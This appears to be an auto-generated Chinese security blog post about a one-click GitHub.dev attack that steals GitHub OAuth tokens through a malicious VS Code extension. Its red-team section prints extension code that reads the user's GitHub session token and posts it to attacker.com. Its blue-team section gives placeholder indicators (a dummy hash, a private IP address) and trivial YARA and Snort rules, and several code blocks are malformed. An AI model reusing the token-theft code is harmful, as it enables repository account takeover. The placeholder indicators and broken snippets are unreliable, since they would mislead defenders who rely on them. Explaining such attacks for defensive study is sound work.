---
layout: post
title:  "One-Click GitHub Dev Attack Lets Attackers Steal Full GitHub OAuth Tokens"
date:   2026-06-03 16:22:54 +0000
categories: [security]
severity: critical
---

# 🚨 解析 GitHub.dev 一鍵攻擊：利用 VS Code 的 OAuth 權限劫持
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: OAuth 權限劫持，可能導致 GitHub倉庫的讀寫權限被竊取
> * **關鍵技術**: OAuth、VS Code Webviews、JavaScript Injection

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: GitHub.dev 的 OAuth 權限授予機制存在缺陷，允許攻擊者通過 VS Code 的 Webviews 功能注入惡意 JavaScript 代碼，從而竊取用戶的 GitHub OAuth 權限。
* **攻擊流程圖解**:
  1. 攻擊者創建一個惡意的 VS Code 擴充套件，包含竊取 OAuth 權限的代碼。
  2. 用戶點擊一個連結，啟動 GitHub.dev 的 VS Code 環境。
  3. 惡意擴充套件被安裝，利用 Webviews 功能注入 JavaScript 代碼到主編輯器窗口。
  4. 代碼模擬鍵盤事件，打開命令面板，安裝惡意擴充套件。
  5. 惡意擴充套件竊取用戶的 GitHub OAuth 權限，傳送給攻擊者。
* **受影響元件**: GitHub.dev、VS Code 1.73.0 及之前版本

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要創建一個惡意的 VS Code 擴充套件，並將其上傳到 GitHub。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 惡意擴充套件的 package.json
    {
      "name": "malicious-extension",
      "version": "1.0.0",
      "description": "",
      "main": "index.js",
      "scripts": {
        "start": "node index.js"
      },
      "keywords": [],
      "author": "",
      "license": "MIT",
      "dependencies": {
        "vscode": "^1.73.0"
      },
      "contributes": {
        "commands": [
          {
            "command": "malicious-command",
            "title": "Malicious Command"
          }
        ]
      }
    }
    
    ```
```

javascript
// 惡意擴充套件的 index.js
const vscode = require('vscode');

vscode.commands.registerCommand('malicious-command', () => {
  //竊取用戶的 GitHub OAuth 權限
  const token = vscode.authentication.getSession('github', ['repo']).then(session => {
    //傳送權限給攻擊者
    fetch('https://attacker.com/token', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ token: session.accessToken })
    });
  });
});

```
* **繞過技術**: 攻擊者可以利用 VS Code 的 local workspace extensions 功能，直接安裝惡意擴充套件，無需用戶確認。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | attacker.com | /usr/local/lib/node_modules/malicious-extension |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_extension {
      meta:
        description = "Detects malicious VS Code extension"
      strings:
        $a = "malicious-command"
      condition:
        $a
    }
    
    ```
```

snort
alert tcp any any -> any 443 (msg:"Malicious VS Code extension detected"; content:"malicious-command"; sid:1000001; rev:1;)

```
* **緩解措施**: 更新 VS Code 至最新版本，禁用 local workspace extensions 功能，監控用戶的 GitHub OAuth 權限。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **OAuth (授權)**: 一種用於授予第三方應用程序訪問用戶資源的授權機制。
* **Webviews (網頁視圖)**: 一種在應用程序中嵌入網頁的技術，允許應用程序與網頁進行交互。
* **JavaScript Injection (JavaScript 注入)**: 一種攻擊技術，通過注入惡意 JavaScript 代碼到網頁中，竊取用戶的敏感信息。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/one-click-github-dev-attack-lets.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1189/)


